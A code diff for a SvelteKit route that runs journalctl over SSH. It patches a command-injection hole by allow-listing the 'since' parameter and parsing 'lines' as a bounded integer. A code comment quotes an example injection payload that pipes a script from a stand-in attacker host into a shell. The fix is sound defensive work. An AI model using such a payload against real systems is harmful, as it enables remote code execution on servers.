@@ -1,30 +1,29 @@
 import { json } from '@sveltejs/kit';
 import type { RequestHandler } from './$types';
-import { db } from '$lib/db';
-import { workers, users } from '$lib/db/schema';
-import { eq } from 'drizzle-orm';
 import { executeSSHCommand, type SSHConnectionConfig } from '$lib/server/ssh';
+import { requireWorker, route } from '$lib/server/auth';
 
-export const GET: RequestHandler = async (event) => {
-  return handleRequest(event);
-};
+/**
+ * A `--since` value that is safe to put in a remote shell command.
+ *
+ * `executeSSHCommand` passes the command as a single argv element, so the
+ * *local* shell never interprets it — but the remote one does, and both of this
+ * route's query parameters were interpolated into it raw. `?since=x"; curl
+ * attacker.sh | sh; echo "` ran as the SSH user on the worker.
+ *
+ * Allow-listed rather than escaped: journalctl takes either an absolute
+ * timestamp or a relative phrase, both of which are plain words, digits, colons
+ * and hyphens. Nothing legitimate needs a quote or a semicolon, so anything
+ * carrying one is refused rather than quietly rewritten.
+ */
+const SAFE_SINCE = /^[A-Za-z0-9 :+\-]{1,64}$/;
 
-export const POST: RequestHandler = async (event) => {
-  return handleRequest(event);
-};
+export const GET: RequestHandler = route((event) => handleRequest(event));
+export const POST: RequestHandler = route((event) => handleRequest(event));
 
-async function handleRequest({ params, url, cookies, request }: any) {
-  const { getSessionIdFromCookies, validateSession } = await import('$lib/auth');
-
-  const sessionId = getSessionIdFromCookies(cookies);
-  const userId = sessionId ? await validateSession(sessionId) : null;
-  if (!userId) return json({ error: 'Unauthorized' }, { status: 401 });
-
-  const user = await db.select().from(users).where(eq(users.id, userId)).get();
-  if (!user || user.role !== 'admin') return json({ error: 'Admin access required' }, { status: 403 });
-
-  const worker = await db.select().from(workers).where(eq(workers.id, params.id)).get();
-  if (!worker) return json({ error: 'Worker not found' }, { status: 404 });
+async function handleRequest(event: any) {
+  const { params, url, request } = event;
+  const { worker } = await requireWorker(event, params.id!);
 
   let sshPrivateKey: string | null = null;
   if (request.method === 'POST') {
@@ -45,7 +44,15 @@ async function handleRequest({ params, url, cookies, request }: any) {
   }
 
   const since = url.searchParams.get('since') || '24 hours ago';
-  const lines = url.searchParams.get('lines') || '1000';
+  if (!SAFE_SINCE.test(since)) {
+    return json(
+      { error: 'Invalid "since" value. Use a plain timestamp or a phrase like "24 hours ago".' },
+      { status: 400 },
+    );
+  }
+
+  // A count, so it is turned into one rather than pattern-matched.
+  const lines = Math.min(Math.max(parseInt(url.searchParams.get('lines') || '1000', 10) || 1000, 1), 100_000);
 
   try {
     const sshConfig: SSHConnectionConfig = {
